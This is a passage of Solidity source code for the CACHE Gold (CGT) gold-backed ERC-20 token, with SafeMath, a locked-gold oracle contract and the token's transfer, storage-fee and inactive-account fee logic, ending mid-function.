remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through `transferFrom`. This is\n     * zero by default.\n     *\n     * This value changes when `approve` or `transferFrom` are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * > Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an `Approval` event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a `Transfer` event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to `approve`. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\nlibrary SafeMath &#123;\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    &#125;\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b &lt;= a, \"SafeMath: subtraction overflow\");\n        uint256 c = a - b;\n        return c;\n    &#125;\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    &#125;\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, \"SafeMath: division by zero\");\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n        return c;\n    &#125;\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        require(b != 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    &#125;\n&#125;\ncontract LockedGoldOracle is Ownable &#123;\n  using SafeMath for uint256;\n  uint256 private _lockedGold;\n  address private _cacheContract;\n  event LockEvent(uint256 amount);\n  event UnlockEvent(uint256 amount);\n  function setCacheContract(address cacheContract) external onlyOwner &#123;\n    _cacheContract = cacheContract;\n  &#125;\n  function lockAmount(uint256 amountGrams) external onlyOwner &#123;\n    _lockedGold = _lockedGold.add(amountGrams);\n    emit LockEvent(amountGrams);\n  &#125;\n  function unlockAmount(uint256 amountGrams) external onlyOwner &#123;\n    _lockedGold = _lockedGold.sub(amountGrams);\n    require(_lockedGold >= CacheGold(_cacheContract).totalCirculation());\n    emit UnlockEvent(amountGrams);\n  &#125;\n  function lockedGold() external view returns(uint256) &#123;\n    return _lockedGold;\n  &#125;\n  function cacheContract() external view returns(address) &#123;\n    return _cacheContract;\n  &#125;\n&#125;\ncontract CacheGold is IERC20, Ownable &#123;\n  using SafeMath for uint256;\n  string public constant name = \"CACHE Gold\";\n  string public constant symbol = \"CGT\";\n  uint8 public constant decimals = 8;\n  uint256 private constant TOKEN = 10 ** uint256(decimals);\n  // Seconds in a day\n  uint256 private constant DAY = 86400;\n  // Days in a year\n  uint256 private constant YEAR = 365;\n  // The maximum transfer fee is 10 basis points\n  uint256 private constant MAX_TRANSFER_FEE_BASIS_POINTS = 10;\n  // Basis points means divide by 10,000 to get decimal\n  uint256 private constant BASIS_POINTS_MULTIPLIER = 10000;\n  // The storage fee of 0.25%\n  uint256 private constant STORAGE_FEE_DENOMINATOR = 40000000000;\n  // The inactive fee of 0.50%\n  uint256 private constant INACTIVE_FEE_DENOMINATOR = 20000000000;\n  // The minimum balance that would accrue a storage fee after 1 day\n  uint256 private constant MIN_BALANCE_FOR_FEES = 146000;\n  // Initial basis points for transfer fee\n  uint256 private _transferFeeBasisPoints = 10;\n  // Cap on total number of tokens that can ever be produced\n  uint256 public constant SUPPLY_CAP = 8133525786 * TOKEN;\n  // How many days need to pass before late fees can be collected (3 years)\n  uint256 public constant INACTIVE_THRESHOLD_DAYS = 1095;\n  // Token balance of each address\n  mapping (address => uint256) private _balances;\n  // Allowed transfer from address\n  mapping (address => mapping (address => uint256)) private _allowances;\n  // Last time storage fee was paid\n  mapping (address => uint256) private _timeStorageFeePaid;\n  // Last time the address produced a transaction on this contract\n  mapping (address => uint256) private _timeLastActivity;\n  // Amount of inactive fees already paid\n  mapping (address => uint256) private _inactiveFeePaid;\n  // If address doesn't have any activity for INACTIVE_THRESHOLD_DAYS\n  // we can start deducting chunks off the address so that\n  // full balance can be recouped after 200 years. This is likely\n  // to happen if the user loses their private key.\n  mapping (address => uint256) private _inactiveFeePerYear;\n  // Addresses not subject to transfer fees\n  mapping (address => bool) private _transferFeeExempt;\n  // Address is not subject to storage fees\n  mapping (address => bool) private _storageFeeExempt;\n  // Save grace period on storage fees for an address\n  mapping (address => uint256) private _storageFeeGracePeriod;\n  // Current total number of tokens created\n  uint256 private _totalSupply;\n  // Address where storage and transfer fees are collected\n  address private _feeAddress;\n  // The address for the \"backed treasury\". When a bar is locked into the\n  // vault for tokens to be minted, they are created in the backed_treasury\n  // and can then be sold from this address.\n  address private _backedTreasury;\n  // The address for the \"unbacked treasury\". The unbacked treasury is a\n  // storing address for excess tokens that are not locked in the vault\n  // and therefore do not correspond to any real world value. If new bars are\n  // locked in the vault, tokens will first be moved from the unbacked\n  // treasury to the backed treasury before minting new tokens.\n  //\n  // This address only accepts transfers from the _backedTreasury or _redeemAddress\n  // the general public should not be able to manipulate this balance.\n  address private _unbackedTreasury;\n  // The address for the LockedGoldOracle that determines the maximum number of\n  // tokens that can be in circulation at any given time\n  address private _oracle;\n  // A fee-exempt address that can be used to collect gold tokens in exchange\n  // for redemption of physical gold\n  address private _redeemAddress;\n  // An address that can force addresses with overdue storage or inactive fee to pay.\n  // This is separate from the contract owner, because the owner will change\n  // to a multisig address after deploy, and we want to be able to write\n  // a script that can sign \"force-pay\" transactions with a single private key\n  address private _feeEnforcer;\n  // Grace period before storage fees kick in\n  uint256 private _storageFeeGracePeriodDays = 0;\n  // When gold bars are locked, we add tokens to circulation either\n  // through moving them from the unbacked treasury or minting new ones,\n  // or some combination of both\n  event AddBackedGold(uint256 amount);\n  // Before gold bars can be unlocked (removed from circulation), they must\n  // be moved to the unbacked treasury, we emit an event when this happens\n  // to signal a change in the circulating supply\n  event RemoveGold(uint256 amount);\n  // When an account has no activity for INACTIVE_THRESHOLD_DAYS\n  // it will be flagged as inactive\n  event AccountInactive(address indexed account, uint256 feePerYear);\n  // If an previoulsy dormant account is reactivated\n  event AccountReActive(address indexed account);\n  /**\n   * @dev Contructor for the CacheGold token sets internal addresses\n   * @param unbackedTreasury The address of the unbacked treasury\n   * @param backedTreasury The address of the backed treasury\n   * @param feeAddress The address where fees are collected\n   * @param redeemAddress The address where tokens are send to redeem physical gold\n   * @param oracle The address of the LockedGoldOracle\n   */\n  constructor(address unbackedTreasury,\n              address backedTreasury,\n              address feeAddress,\n              address redeemAddress,\n              address oracle) public &#123;\n    _unbackedTreasury = unbackedTreasury;\n    _backedTreasury = backedTreasury;\n    _feeAddress = feeAddress;\n    _redeemAddress = redeemAddress;\n    _feeEnforcer = owner();\n    _oracle = oracle;\n    setFeeExempt(_feeAddress);\n    setFeeExempt(_redeemAddress);\n    setFeeExempt(_backedTreasury);\n    setFeeExempt(_unbackedTreasury);\n    setFeeExempt(owner());\n  &#125;\n  /**\n   * @dev Throws if called by any account other than THE ENFORCER\n   */\n  modifier onlyEnforcer() &#123;\n    require(msg.sender == _feeEnforcer);\n    _;\n  &#125;\n  /**\n  * @dev Transfer token for a specified address\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  */\n  function transfer(address to, uint256 value) external returns (bool) &#123;\n    // Update activity for the sender\n    _updateActivity(msg.sender);\n    // Can opportunistically mark an account inactive if someone\n    // sends money to it\n    if (_shouldMarkInactive(to)) &#123;\n      _setInactive(to);\n    &#125;\n    _transfer(msg.sender, to, value);\n    return true;\n  &#125;\n  /**\n  * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n  * Beware that changing an allowance with this method brings the risk that someone may use both the old\n  * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n  * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n  * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n  * @param spender The address which will spend the funds.\n  * @param value The amount of tokens to be spent.\n  */\n  function approve(address spender, uint256 value) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, value);\n    return true;\n  &#125;\n  /**\n  * @dev Transfer tokens from one address to another.\n  * Note that while this function emits an Approval event, this is not required as per the specification,\n  * and other compliant implementations may not emit the event.\n  * Also note that even though balance requirements are not explicitly checked,\n  * any transfer attempt over the approved amount will automatically fail due to\n  * SafeMath revert when trying to subtract approval to a negative balance\n  * @param from address The address which you want to send tokens from\n  * @param to address The address which you want to transfer to\n  * @param value uint256 the amount of tokens to be transferred\n  */\n  function transferFrom(address from, address to, uint256 value) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _transfer(from, to, value);\n    _approve(from, msg.sender, _allowances[from][msg.sender].sub(value));\n    return true;\n  &#125;\n  /**\n  * @dev Increase the amount of tokens that an owner allowed to a spender.\n  * approve should be called when allowed_[_spender] == 0. To increment\n  * allowed value is better to use this function to avoid 2 calls (and wait until\n  * the first transaction is mined)\n  * From MonolithDAO Token.sol\n  * Emits an Approval event.\n  * @param spender The address which will spend the funds.\n  * @param addedValue The amount of tokens to increase the allowance by.\n  */\n  function increaseAllowance(address spender, uint256 addedValue) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n    return true;\n  &#125;\n  /**\n  * @dev Decrease the amount of tokens that an owner allowed to a spender.\n  * approve should be called when allowed_[_spender] == 0. To decrement\n  * allowed value is better to use this function to avoid 2 calls (and wait until\n  * the first transaction is mined)\n  * From MonolithDAO Token.sol\n  * Emits an Approval event.\n  * @param spender The address which will spend the funds.\n  * @param subtractedValue The amount of tokens to decrease the allowance by.\n  */\n  function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));\n    return true;\n  &#125;\n  /**\n  * @dev Function to add a certain amount of backed tokens. This will first\n  * take any tokens from the _unbackedTreasury address and move them to the\n  * _backedTreasury. Any remaining tokens will actually be minted.\n  * This operation will fail if there is not a sufficient supply of locked gold\n  * as determined by the LockedGoldOracle\n  *\n  * @param value The amount of tokens to add to the backed treasury\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function addBackedTokens(uint256 value) external onlyOwner returns (bool)\n  &#123;\n    uint256 unbackedBalance = _balances[_unbackedTreasury];\n    // Use oracle to check if there is actually enough gold\n    // in custody to validate this operation\n    uint256 lockedGrams =  LockedGoldOracle(_oracle).lockedGold();\n    // Should reject mint if it would make the total supply\n    // exceed the amount actually locked in vault\n    require(lockedGrams >= totalCirculation().add(value),\n            \"Insufficent grams locked in LockedGoldOracle to complete operation\");\n    // If we have sufficient balance, just move from the unbacked to backed\n    // treasury address\n    if (value &lt;= unbackedBalance) &#123;\n      _transfer(_unbackedTreasury, _backedTreasury, value);\n    &#125; else &#123;\n      if (unbackedBalance > 0) &#123;\n        // There is no sufficient balance, so we have to both transfer and mint new tokens\n        // Transfer the remaining unbacked treasury balance to backed treasury\n        _transfer(_unbackedTreasury, _backedTreasury, unbackedBalance);\n      &#125;\n      // And mint the remaining to the backed treasury\n      _mint(value.sub(unbackedBalance));\n    &#125;\n    emit AddBackedGold(value);\n    return true;\n  &#125;\n  /**\n  * @dev Manually pay storage fees on senders address. Exchanges may want to\n  * periodically call this function to pay owed storage fees. This is a\n  * cheaper option than 'send to self', which would also trigger paying\n  * storage fees\n  *\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function payStorageFee() external returns (bool) &#123;\n    _updateActivity(msg.sender);\n    _payStorageFee(msg.sender);\n    return true;\n  &#125;\n  function setAccountInactive(address account) external onlyEnforcer returns (bool) &#123;\n    require(_shouldMarkInactive(account), \"Account not eligible to be marked inactive\");\n    _setInactive(account);\n  &#125;\n  /**\n  * @dev Contract allows the forcible collection of storage fees on an address\n  * if it is has been more than than 365 days since the last time storage fees\n  * were paid on this address.\n  *\n  * Alternatively inactive fees may also be collected periodically on a prorated\n  * basis if the account is currently marked as inactive.\n  *\n  * @param account The address to pay storage fees on\n  * @return A boolean that indicates if the operation was successful.\n  */\n  function forcePayFees(address account) external onlyEnforcer returns(bool) &#123;\n    require(account != address(0));\n    require(_balances[account] > 0,\n            \"Account has no balance, cannot force paying fees\");\n    // If account is inactive, pay inactive fees\n    if (isInactive(account)) &#123;\n      uint256 paid = _payInactiveFee(account);\n      require(paid > 0);\n    &#125; else if (_shouldMarkInactive(account)) &#123;\n      // If it meets inactive threshold, but hasn't been set yet, set it.\n      // This will also trigger automatic payment of owed storage fees\n      // before starting inactive fees\n      _setInactive(account);\n    &#125; else &#123;\n      // Otherwise just force paying owed storage fees, which can only\n      // be called if they are more than 365 days overdue\n      require(daysSincePaidStorageFee(account) >= YEAR,\n              \"Account has paid storage fees more recently than 365 days\");\n      uint256 paid = _payStorageFee(account);\n      require(paid > 0, \"No appreciable storage fees due, will refund gas\");\n    &#125;\n  &#125;\n  /**\n  * @dev Set the address that can force collecting fees from users\n  * @param enforcer The address to force collecting fees\n  * @return An bool representing successfully changing enforcer address\n  */\n  function setFeeEnforcer(address enforcer) external onlyOwner returns(bool) &#123;\n    require(enforcer != address(0));\n    _feeEnforcer = enforcer;\n    setFeeExempt(_feeEnforcer);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to collect fees\n  * @param newFeeAddress The address to collect storage and transfer fees\n  * @return An bool representing successfully changing fee address\n  */\n  function setFeeAddress(address newFeeAddress) external onlyOwner returns(bool) &#123;\n    require(newFeeAddress != address(0));\n    require(newFeeAddress != _unbackedTreasury,\n            \"Cannot set fee address to unbacked treasury\");\n    _feeAddress = newFeeAddress;\n    setFeeExempt(_feeAddress);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to deposit tokens when redeeming for physical locked bars.\n  * @param newRedeemAddress The address to redeem tokens for bars\n  * @return An bool representing successfully changing redeem address\n  */\n  function setRedeemAddress(address newRedeemAddress) external onlyOwner returns(bool) &#123;\n    require(newRedeemAddress != address(0));\n    require(newRedeemAddress != _unbackedTreasury,\n            \"Cannot set redeem address to unbacked treasury\");\n    _redeemAddress = newRedeemAddress;\n    setFeeExempt(_redeemAddress);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address of backed treasury\n  * @param newBackedAddress The address of backed treasury\n  * @return An bool representing successfully changing backed address\n  */\n  function setBackedAddress(address newBackedAddress) external onlyOwner returns(bool) &#123;\n    require(newBackedAddress != address(0));\n    require(newBackedAddress != _unbackedTreasury,\n            \"Cannot set backed address to unbacked treasury\");\n    _backedTreasury = newBackedAddress;\n    setFeeExempt(_backedTreasury);\n    return true;\n  &#125;\n  /**\n  * @dev Set the address to unbacked treasury\n  * @param newUnbackedAddress The address of unbacked treasury\n  * @return An bool representing successfully changing unbacked address\n  */\n  function setUnbackedAddress(address newUnbackedAddress) external onlyOwner returns(bool) &#123;\n    require(newUnbackedAddress != address(0));\n    require(newUnbackedAddress != _backedTreasury,\n            \"Cannot set unbacked treasury to backed treasury\");\n    require(newUnbackedAddress != _feeAddress,\n            \"Cannot set unbacked treasury to fee address \");\n    require(newUnbackedAddress != _redeemAddress,\n            \"Cannot set unbacked treasury to fee address \");\n    _unbackedTreasury = newUnbackedAddress;\n    setFeeExempt(_unbackedTreasury);\n    return true;\n  &#125;\n  /**\n  * @dev Set the LockedGoldOracle address\n  * @param oracleAddress The address for oracle\n  * @return An bool representing successfully changing oracle address\n  */\n  function setOracleAddress(address oracleAddress) external onlyOwner returns(bool) &#123;\n    require(oracleAddress != address(0));\n    _oracle = oracleAddress;\n    return true;\n  &#125;\n  /**\n  * @dev Set the number of days before storage fees begin accruing.\n  * @param daysGracePeriod The global setting for the grace period before storage\n  * fees begin accruing. Note that calling this will not change the grace period\n  * for addresses already actively inside a grace period\n  */\n  function setStorageFeeGracePeriodDays(uint256 daysGracePeriod) external onlyOwner &#123;\n    _storageFeeGracePeriodDays = daysGracePeriod;\n  &#125;\n  /**\n  * @dev Set this account as being exempt from transfer fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from transfer fees\n  */\n  function setTransferFeeExempt(address account) external onlyOwner &#123;\n    _transferFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Set this account as being exempt from storage fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from storage fees\n  */\n  function setStorageFeeExempt(address account) external onlyOwner &#123;\n    _storageFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Set account is no longer exempt from all fees\n  * @param account The account to reactivate fees\n  */\n  function unsetFeeExempt(address account) external onlyOwner &#123;\n    _transferFeeExempt[account] = false;\n    _storageFeeExempt[account] = false;\n  &#125;\n  /**\n  * @dev Set a new transfer fee in basis points, must be less than or equal to 10 basis points\n  * @param fee The new transfer fee in basis points\n  */\n  function setTransferFeeBasisPoints(uint256 fee) external onlyOwner &#123;\n    require(fee &lt;= MAX_TRANSFER_FEE_BASIS_POINTS,\n            \"Transfer fee basis points must be an integer between 0 and 10\");\n    _transferFeeBasisPoints = fee;\n  &#125;\n  /**\n  * @dev Gets the balance of the specified address deducting owed fees and\n  * accounting for the maximum amount that could be sent including transfer fee\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount sendable by the passed address\n  * including transaction and storage fees\n  */\n  function balanceOf(address owner) external view returns (uint256) &#123;\n    return calcSendAllBalance(owner);\n  &#125;\n  /**\n  * @dev Gets the balance of the specified address not deducting owed fees.\n  * this returns the 'traditional' ERC-20 balance that represents the balance\n  * currently stored in contract storage.\n  * @param owner The address to query the balance of.\n  * @return An uint256 representing the amount stored in passed address\n  */\n  function balanceOfNoFees(address owner) external view returns (uint256) &#123;\n    return _balances[owner];\n  &#125;\n  /**\n  * @dev Total number of tokens in existence. This includes tokens\n  * in the unbacked treasury that are essentially unusable and not\n  * in circulation\n  * @return A uint256 representing the total number of minted tokens\n  */\n  function totalSupply() external view returns (uint256) &#123;\n    return _totalSupply;\n  &#125;\n  /**\n  * @dev Function to check the amount of tokens that an owner allowed to a spender.\n  * @param owner address The address which owns the funds.\n  * @param spender address The address which will spend the funds.\n  * @return A uint256 specifying the amount of tokens still available for the spender.\n  */\n  function allowance(address owner, address spender) external view returns (uint256) &#123;\n    return _allowances[owner][spender];\n  &#125;\n  /**\n  * @return address that can force paying overdue inactive fees\n  */\n  function feeEnforcer() external view returns(address) &#123;\n    return _feeEnforcer;\n  &#125;\n  /**\n   * @return address where fees are collected\n   */\n  function feeAddress() external view returns(address) &#123;\n    return _feeAddress;\n  &#125;\n  /**\n   * @return address for redeeming tokens for gold bars\n   */\n  function redeemAddress() external view returns(address) &#123;\n    return _redeemAddress;\n  &#125;\n  /**\n   * @return address for backed treasury\n   */\n  function backedTreasury() external view returns(address) &#123;\n    return _backedTreasury;\n  &#125;\n  /**\n  * @return address for unbacked treasury\n  */\n  function unbackedTreasury() external view returns(address) &#123;\n    return _unbackedTreasury;\n  &#125;\n  /**\n  * @return address for oracle contract\n  */\n  function oracleAddress() external view returns(address) &#123;\n    return _oracle;\n  &#125;\n  /**\n  * @return the current number of days and address is exempt\n  * from storage fees upon receiving tokens\n  */\n  function storageFeeGracePeriodDays() external view returns(uint256) &#123;\n    return _storageFeeGracePeriodDays;\n  &#125;\n  /**\n  * @return the current transfer fee in basis points [0-10]\n  */\n  function transferFeeBasisPoints() external view returns(uint256) &#123;\n    return _transferFeeBasisPoints;\n  &#125;\n  /**\n  * @dev Simulate the transfer from one address to another see final balances and associated fees\n  * @param from The address to transfer from.\n  * @param to The address to transfer to.\n  * @param value The amount to be transferred.\n  * @return See _simulateTransfer function\n  */\n  function simulateTransfer(address from, address to, uint256 value) external view returns (uint256[5] memory) &#123;\n    return _simulateTransfer(from, to, value);\n  &#125;\n  /**\n  * @dev Set this account as being exempt from all fees. This may be used\n  * in special circumstance for cold storage addresses owed by Cache, exchanges, etc.\n  * @param account The account to exempt from storage and transfer fees\n  */\n  function setFeeExempt(address account) public onlyOwner &#123;\n    _transferFeeExempt[account] = true;\n    _storageFeeExempt[account] = true;\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from storage fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from storage fees\n  */\n  function isStorageFeeExempt(address account) public view returns(bool) &#123;\n    return _storageFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from transfer fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from transfer fees\n  */\n  function isTransferFeeExempt(address account) public view returns(bool) &#123;\n    return _transferFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address given is extempt from transfer fees\n  * @param account The address to check\n  * @return A boolean if the address passed is exempt from transfer fees\n  */\n  function isAllFeeExempt(address account) public view returns(bool) &#123;\n    return _transferFeeExempt[account] &amp;&amp; _storageFeeExempt[account];\n  &#125;\n  /**\n  * @dev Check if the address is considered inactive for not having transacted with\n  * the contract for INACTIVE_THRESHOLD_DAYS\n  * @param account The address to check\n  * @return A boolean if the address passed is considered inactive\n  */\n  function isInactive(address account) public view returns(bool) &#123;\n    return _inactiveFeePerYear[account] > 0;\n  &#125;\n  /**\n  * @dev Total number of tokens that are actually in circulation, which is\n  * total tokens excluding the unbacked treasury\n  * @return A uint256 representing the total number of tokens in circulation\n  */\n  function totalCirculation() public view returns (uint256) &#123;\n    return _totalSupply.sub(_balances[_unbackedTreasury]);\n  &#125;\n  /**\n  * @dev Get the number of days since the account last paid storage fees\n  * @param account The address to check\n  * @return A uint256 representing the number of days since storage fees where last paid\n  */\n  function daysSincePaidStorageFee(address account) public view returns(uint256) &#123;\n    if (isInactive(account) || _timeStorageFeePaid[account] == 0) &#123;\n      return 0;\n    &#125;\n    return block.timestamp.sub(_timeStorageFeePaid[account]).div(DAY);\n  &#125;\n  /**\n  * @dev Get the days since the account last sent a transaction to the contract (activity)\n  * @param account The address to check\n  * @return A uint256 representing the number of days since the address last had activity\n  * with the contract\n  */\n  function daysSinceActivity(address account) public view returns(uint256) &#123;\n    if (_timeLastActivity[account] == 0) &#123;\n      return 0;\n    &#125;\n    return block.timestamp.sub(_timeLastActivity[account]).div(DAY);\n  &#125;\n  /**\n  * @dev Returns the total number of fees owed on a particular address\n  * @param account The address to check\n  * @return The total storage and inactive fees owed on the address\n  */\n  function calcOwedFees(address account) public view returns(uint256) &#123;\n    return calcStorageFee(account).add(calcInactiveFee(account));\n  &#125;\n  /**\n   * @dev Calculate the current storage fee owed for a given address\n   * @param account The address to check\n   * @return A uint256 representing current storage fees for the address\n   */\n  function calcStorageFee(address account) public view returns(uint256) &#123;\n    // If an account is in an inactive state those fees take over and\n    // storage fees are effectively paused\n    uint256 balance = _balances[account];\n    if (isInactive(account) || isStorageFeeExempt(account) || balance == 0) &#123;\n      return 0;\n    &#125;\n    uint256 daysSinceStoragePaid = daysSincePaidStorageFee(account);\n    uint256 daysInactive = daysSinceActivity(account);\n    uint256 gracePeriod = _storageFeeGracePeriod[account];\n    // If there is a grace period, we can deduct it from the daysSinceStoragePaid\n    if (gracePeriod > 0) &#123;\n      if (daysSinceStoragePaid > gracePeriod) &#123;\n        daysSinceStoragePaid = daysSinceStoragePaid.sub(gracePeriod);\n      &#125; else &#123;\n        daysSinceStoragePaid = 0;\n      &#125;\n    &#125;\n    if (daysSinceStoragePaid == 0) &#123;\n      return 0;\n    &#125;\n    // This is an edge case where the account has not yet been marked inactive, but\n    // will be marked inactive whenever there is a transaction allowing it to be marked.\n    // Therefore we know storage fees will only be valid up to a point, and inactive\n    // fees will take over.\n    if (daysInactive >= INACTIVE_THRESHOLD_DAYS) &#123;\n      // This should not be at risk of being negative, because its impossible to force paying\n      // storage fees without also setting the account to inactive, so if we are here it means\n      // the last time storage fees were paid was BEFORE the account became eligible to be inactive\n      // and it's always the case that daysSinceStoragePaid > daysInactive.sub(INACTIVE_THRESHOLD_DAYS)\n      daysSinceStoragePaid = daysSinceStoragePaid.sub(daysInactive.sub(INACTIVE_THRESHOLD_DAYS));\n    &#125;\n    // The normal case with normal storage fees\n    return storageFee(balance, daysSinceStoragePaid);\n  &#125;\n  /**\n   * @dev Calculate the current inactive fee for a given address\n   * @param account The address to check\n   * @return A uint256 representing current inactive fees for the address\n   */\n  function calcInactiveFee(address account) public view returns(uint256) &#123;\n    uint256 balance = _balances[account];\n    uint256 daysInactive = daysSinceActivity(account);\n    // if the account is marked inactive already, can use the snapshot balance\n    if (isInactive(account)) &#123;\n      return _calcInactiveFee(balance,\n                          daysInactive,\n                          _inactiveFeePerYear[account],\n                          _inactiveFeePaid[account]);\n    &#125; else if (_shouldMarkInactive(account)) &#123;\n      // Account has not yet been marked inactive in contract, but the inactive fees will still be due.\n      // Just assume snapshotBalance will be current balance after fees\n      uint256 snapshotBalance = balance.sub(calcStorageFee(account));\n      return _calcInactiveFee(snapshotBalance,                          // current balance\n                              daysInactive,                             // number of days inactive\n                              _calcInactiveFeePerYear(snapshotBalance), // the inactive fee per year based on balance\n                              0);                                       // fees paid already\n    &#125;\n    return 0;\n  &#125;\n  /**\n   * @dev Calculate the amount that would clear the balance from the address\n   * accounting for owed storage and transfer fees\n   * accounting for storage and transfer fees\n   * @param account The address to check\n   * @return A uint256 representing total amount an address has available to send\n   */\n  function calcSendAllBalance(address account) public view returns (uint256) &#123;\n    require(account != address(0));\n    // Internal addresses pay no fees, so they can send their entire balance\n    uint256 balanceAfterStorage = _balances[account].sub(calcOwedFees(account));\n    if (_transferFeeBasisPoints == 0 || isTransferFeeExempt(account)) &#123;\n      return balanceAfterStorage;\n    &#125;\n    // Edge cases where remaining balance is 0.00000001, but is effectively 0\n    if (balanceAfterStorage &lt;= 1) &#123;\n      return 0;\n    &#125;\n    // Calculate the send all amount including storage fee\n    // Send All = Balance / 1.001\n    // and round up 0.00000001\n    uint256 divisor = TOKEN.add(_transferFeeBasisPoints.mul(BASIS_POINTS_MULTIPLIER));\n    uint256 sendAllAmount = balanceAfterStorage.mul(TOKEN).div(divisor).add(1);\n    // Calc transfer fee on send all amount\n    uint256 transFee = sendAllAmount.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n    // Fix to include rounding errors\n    if (sendAllAmount.add(transFee) > balanceAfterStorage) &#123;\n      return sendAllAmount.sub(1);\n    &#125;\n    return sendAllAmount;\n  &#125;\n  /*\n   * @dev Calculate the transfer fee on an amount\n   * @param value The value being sent\n   * @return A uint256 representing the transfer fee on sending the value given\n   */\n  function calcTransferFee(address account, uint256 value) public view returns(uint256) &#123;\n    if (isTransferFeeExempt(account)) &#123;\n      return 0;\n    &#125;\n    // Basis points -> decimal multiplier:\n    // f(x) = x / 10,0000 (10 basis points is 0.001)\n    // So transfer fee working with integers =\n    // f(balance, basis) = (balance * TOKEN) / (10,000 * TOKEN / basis)\n    return value.mul(_transferFeeBasisPoints).div(BASIS_POINTS_MULTIPLIER);\n  &#125;\n  /*\n   * @dev Calculate the storage fee for a given balance after a certain number of\n   * days have passed since the last time fees were paid.\n   * @param balance The current balance of the address\n   * @param daysSinceStoragePaid The number days that have passed since fees where last paid\n   * @return A uint256 representing the storage fee owed\n   */\n  function storageFee(uint256 balance, uint256 daysSinceStoragePaid) public pure returns(uint256) &#123;\n    uint256 fee = 